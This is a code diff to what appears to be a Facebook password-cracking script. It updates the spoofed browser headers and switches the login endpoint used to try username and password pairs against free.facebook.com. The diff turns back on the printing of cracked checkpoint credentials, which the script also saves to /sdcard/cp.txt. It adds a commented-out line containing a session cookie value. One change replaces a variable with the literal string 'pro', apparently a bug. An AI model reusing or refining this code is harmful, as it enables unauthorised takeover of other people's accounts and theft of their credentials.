@@ -533,23 +533,27 @@ def rcrack1(uid,pwx,tl):
             header_freefb = {'authority': 'free.facebook.com',
             'method': 'GET', 
             'scheme': 'https', 
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="113.0.5672.127", "Chromium";v="113.0.5672.127", "Not-A.Brand";v="24.0.0.0"',
+            # 'cookie': 'sb=Xq4iZonTrfV_leYf6nPacQet; datr=Xq4iZu2ozZ19Gkb2TVJOaDkd; ps_n=1; ps_l=1; locale=en_US; dpr=3.752533197402954; m_pixel_ratio=3.752533197402954; wd=685x1257; fr=0xfDlbIj9EYumAA8K.AWWy_XhXfZkl5zA5Z4QSvi9PYk0.BmIq5e..AAA.0.0.BmI9lv.AWWL5x2XBhY',
+            'dpr': '2.625',
+            'referer': 'https://free.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="122", "Google Chrome";v="122"',
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="122.0.6295.197", "Google Chrome";v="122.0.6295.197"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-ch-ua-platform-version': '""',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'same-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':pro}
-            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'user-agent': 'pro',
+            'viewport-width': '980',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
@@ -577,7 +581,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-                #print(f"\x1b[38;5;196m[CP] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
+                print(f"\x1b[38;5;196m[CP] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
 
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
